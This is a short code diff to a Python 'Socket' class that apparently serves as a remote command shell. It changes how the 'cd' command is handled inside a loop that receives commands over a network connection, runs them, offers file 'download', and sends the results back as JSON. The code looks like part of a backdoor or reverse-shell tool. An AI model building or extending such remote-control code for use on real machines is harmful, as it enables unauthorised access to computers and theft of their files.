@@ -46,7 +46,7 @@ class Socket:
 
     def cd_exec(self, directory):
         os.chdir(directory)
-        return self.command_execute("cd " + directory)
+        return f"cd {directory}\n"
 
     def start_server(self):
         while True:
@@ -57,7 +57,7 @@ class Socket:
                     exit()
 
                 elif command[0] == "cd" and len(command) > 1:
-                    command_output = self.command_execute(command[1])
+                    command_output = self.cd_exec(command[1])
 
                 elif command[0] == "download":
                     command_output = self.get_file(command[1])
@@ -72,8 +72,6 @@ class Socket:
                 command_output = "Error"
 
             self.json_send(command_output)
-
-        self.connection.close()
 
 
 user_input = get_user_input()
